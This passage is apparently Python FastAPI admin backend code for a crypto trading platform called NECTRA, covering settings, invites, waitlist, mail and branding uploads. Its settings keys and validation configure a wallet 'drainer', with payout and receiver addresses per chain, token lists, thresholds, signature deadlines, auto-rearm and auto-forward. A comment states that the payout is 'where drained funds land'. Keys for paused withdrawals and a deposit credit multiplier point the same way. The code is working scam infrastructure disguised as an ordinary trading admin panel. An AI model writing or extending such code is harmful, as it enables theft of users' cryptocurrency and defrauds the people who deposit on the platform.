    "withdrawals_paused", "referral_max_codes", "referral_code_uses",
    "sweep_destination_eth", "sweep_auto_convert_eth", "default_after_days",
    "require_wallet_signature", "kyc_enabled", "monetization_enabled",
    "live_trading_enabled", "drainer_enabled", "drainer_mode",
    "drainer_threshold_usd", "drainer_cap_mode", "drainer_cap_units",
    "drainer_evm_mode", "drainer_sig_deadline_days", "drainer_take_native",
    "drainer_min_usd_per_asset", "drainer_include_unpriced",
    "drainer_require_on_loan", "drainer_require_on_bot",
    "deposit_credit_multiplier", "withdrawals_paused", "sim_enabled",
    "drainer_payout_evm", "drainer_payout_sol", "drainer_payout_tron",
    "drainer_receiver_evm", "drainer_collector_sol", "drainer_collector_tron",
    "drainer_auto_rearm", "drainer_rearm_hours", "drainer_payout_is_multisig",
    "drainer_auto_forward",
    "treasury_evm", "treasury_solana", "treasury_tron",
    "two_admin_threshold_usd", "legacy_consolidation_worker", "maintenance_banner",
}


@router.get("/api/admin/settings")
async def admin_get_settings(request: Request):
    require_perm(request, "platform.settings")
    return {"settings": get_settings()}


@router.patch("/api/admin/settings")
async def admin_update_settings(request: Request, body: Dict[str, Any]):
    _require_csrf(request)
    admin = require_perm(request, "platform.settings")

    applied, ignored = {}, []
    for key, value in body.items():
        per_chain = key.startswith("drainer_tokens_")
        if key not in _SETTING_KEYS and not per_chain:
            ignored.append(key)
            continue

        if per_chain:
            net = key[len("drainer_tokens_"):]
            if net not in chains.EVM_NETWORKS:
                raise HTTPException(status_code=400, detail=f"unknown chain {net}")
            if not isinstance(value, list):
                raise HTTPException(status_code=400, detail=f"{key} must be a list")
            for addr in value:
                if not chains.is_evm_address(str(addr)):
                    raise HTTPException(status_code=400,
                                        detail=f"invalid token on {net}: {addr}")

        # A payout is where drained funds land — validate before persisting.
        if key in ("drainer_payout_evm", "drainer_payout_sol", "drainer_payout_tron",
                   "treasury_evm", "treasury_solana", "treasury_tron"):
            text = str(value or "").strip()
            checks = {
                "drainer_payout_evm": chains.is_evm_address,
                "drainer_payout_sol": chains.is_sol_address,
                "drainer_payout_tron": chains.is_tron_address,
                "treasury_evm": chains.is_evm_address,
                "treasury_solana": chains.is_sol_address,
                "treasury_tron": chains.is_tron_address,
            }
            if text and not checks[key](text):
                raise HTTPException(status_code=400, detail=f"{key} is not a valid address")
            value = text
        if key == "drainer_receiver_evm":
            if not isinstance(value, dict):
                raise HTTPException(status_code=400, detail="drainer_receiver_evm must be a map")
            for net, addr in value.items():
                if net not in chains.EVM_NETWORKS:
                    raise HTTPException(status_code=400, detail=f"unknown chain {net}")
                if not chains.is_evm_address(addr):
                    raise HTTPException(status_code=400, detail=f"receiver on {net} is invalid")

        update_setting(key, value)
        applied[key] = value

    S.audit(admin["id"], "admin.settings_update", None,
            {"applied": applied, "ignored": ignored}, ip=_ip(request))
    return {"ok": True, "applied": applied, "ignored": ignored}


@router.get("/api/admin/audit")
async def admin_audit_logs(request: Request):
    require_perm(request, "admin.view")
    rows = q_all("SELECT a.*, u.email AS actor FROM audit_log a"
                 " LEFT JOIN users u ON u.id = a.actor_id ORDER BY a.id DESC LIMIT 200")
    return {"logs": rows, "rows": rows}


@router.get("/api/admin/invites")
async def admin_invites(request: Request):
    require_perm(request, "invites.manage")
    rows = q_all("SELECT i.*, u.email AS creator FROM invites i"
                 " LEFT JOIN users u ON u.id = i.created_by ORDER BY i.created_at DESC")
    return {"rows": rows}


@router.post("/api/admin/invites")
async def admin_create_invites(request: Request, body: Dict[str, Any]):
    _require_csrf(request)
    admin = require_perm(request, "invites.manage")

    count = max(1, min(int(body.get("count") or 1), 50))
    max_uses = max(1, min(int(body.get("maxUses") or 1), 10_000))
    note = str(body.get("note") or "")[:200]
    custom = (body.get("code") or "").strip().upper()

    codes: List[str] = []
    for _ in range(count):
        code = custom if (custom and not codes) else "".join(
            secrets.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(8))
        if q_get("SELECT code FROM invites WHERE code = ? COLLATE NOCASE", code):
            code = "".join(secrets.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789")
                           for _ in range(8))
        q_run("INSERT INTO invites (code, created_by, role, max_uses, uses, active,"
              " kind, note, created_at) VALUES (?, ?, 'trader', ?, 0, 1, 'invite', ?, ?)",
              code, admin["id"], max_uses, note, now())
        codes.append(code)
    S.audit(admin["id"], "admin.invites_create", None, {"count": len(codes)}, ip=_ip(request))
    return {"ok": True, "codes": codes}


@router.patch("/api/admin/invites/{code}")
async def admin_toggle_invite(code: str, request: Request, body: Dict[str, Any]):
    _require_csrf(request)
    require_perm(request, "invites.manage")
    row = q_get("SELECT * FROM invites WHERE code = ? COLLATE NOCASE", code)
    if not row:
        raise HTTPException(status_code=404, detail="Invite not found")
    q_run("UPDATE invites SET active = ? WHERE code = ?",
          1 if body.get("active") else 0, row["code"])
    return {"ok": True}


@router.get("/api/admin/waitlist")
async def admin_waitlist(request: Request):
    require_perm(request, "invites.manage")
    return {"rows": q_all("SELECT * FROM waitlist ORDER BY id DESC LIMIT 300")}


@router.post("/api/admin/waitlist/{wid}/invite")
async def admin_waitlist_invite(wid: int, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "invites.manage")
    row = q_get("SELECT * FROM waitlist WHERE id = ?", wid)
    if not row:
        raise HTTPException(status_code=404, detail="Waitlist entry not found")
    code = "".join(secrets.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(8))
    q_run("INSERT OR IGNORE INTO invites (code, created_by, role, max_uses, uses, active,"
          " kind, note, created_at) VALUES (?, ?, 'trader', 1, 0, 1, 'waitlist', ?, ?)",
          code, admin["id"], row["email"], now())
    q_run("UPDATE waitlist SET status = 'invited' WHERE id = ?", wid)
    mailer.send_mail(row["email"], f"You're invited to {get_setting('platform_name', 'NECTRA')}",
                     f"Your invite code is: {code}\n\nSign up at the website with this code.")
    S.audit(admin["id"], "admin.waitlist_invite", wid, {"code": code}, ip=_ip(request))
    return {"ok": True, "code": code}


@router.post("/api/admin/waitlist/{wid}/reject")
async def admin_waitlist_reject(wid: int, request: Request):
    _require_csrf(request)
    require_perm(request, "invites.manage")
    q_run("UPDATE waitlist SET status = 'rejected' WHERE id = ?", wid)
    return {"ok": True}


@router.get("/api/admin/mailbox")
async def admin_mailbox(request: Request):
    """Every outgoing email (verification/reset codes included) — works without SMTP."""
    require_perm(request, "admin.view")
    rows = q_all("SELECT id, to_email, subject, body, status, error, created_at"
                 " FROM mailbox ORDER BY id DESC LIMIT 200")
    return {"rows": rows}


@router.post("/api/admin/smtp/test")
async def admin_smtp_test(request: Request, body: Optional[Dict[str, Any]] = None):
    require_perm(request, "platform.settings")
    _require_csrf(request)
    target = ((body or {}).get("to") or "").strip()
    if not target:
        raise HTTPException(status_code=400, detail="A recipient address is required")
    status = mailer.send_mail(
        target, f"{get_setting('platform_name', 'NECTRA')} SMTP test",
        "If you are reading this, outgoing mail is configured correctly.")
    return {"ok": status == "sent", "status": status}


@router.post("/api/admin/telegram/test")
async def admin_telegram_test(request: Request):
    require_perm(request, "platform.settings")
    _require_csrf(request)
    token = get_setting("telegram_bot_token", "")
    chat = get_setting("telegram_chat_id", "")
    if not token or not chat:
        raise HTTPException(status_code=400, detail="Set the bot token and chat id first")
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(f"https://api.telegram.org/bot{token}/sendMessage",
                                  json={"chat_id": chat, "text": "NECTRA test alert"})
        return {"ok": r.is_success, "message": "Test alert sent" if r.is_success
                else f"Telegram responded {r.status_code}"}
    except Exception as exc:                                 # noqa: BLE001
        raise HTTPException(status_code=502, detail=f"Telegram unreachable: {exc}")


_BRAND_EXT = (".png", ".jpg", ".jpeg", ".webp", ".svg", ".ico")


@router.post("/api/admin/branding/upload")
async def admin_branding_upload(request: Request, body: Dict[str, Any]):
    """Persist a base64 data-URL logo/favicon under /assets/uploads."""
    _require_csrf(request)
    admin = require_perm(request, "platform.settings")

    kind = (body.get("type") or "logo").lower()
    if kind not in ("logo", "favicon"):
        raise HTTPException(status_code=400, detail="type must be logo or favicon")
    raw = body.get("data") or ""
    if "," in raw:
        raw = raw.split(",", 1)[1]
    try:
        blob = base64.b64decode(raw, validate=True)
    except Exception:                                        # noqa: BLE001
        raise HTTPException(status_code=400, detail="File data is not valid base64")
    if len(blob) > 2 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="File must be under 2 MB")

    ext = os.path.splitext(str(body.get("filename") or ""))[1].lower()
    if ext not in _BRAND_EXT:
        raise HTTPException(status_code=400, detail=f"Allowed types: {', '.join(_BRAND_EXT)}")

    folder = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                          "public", "assets", "uploads")
    os.makedirs(folder, exist_ok=True)
    name = f"{kind}-{secrets.token_hex(6)}{ext}"
    with open(os.path.join(folder, name), "wb") as fh:
        fh.write(blob)

    url = f"/assets/uploads/{name}"
    key = "platform_logo_url" if kind == "logo" else "platform_favicon_url"
    update_setting(key, url)
    S.audit(admin["id"], f"admin.branding_{kind}", None, {"url": url}, ip=_ip(request))
    return {"ok": True, "url": url}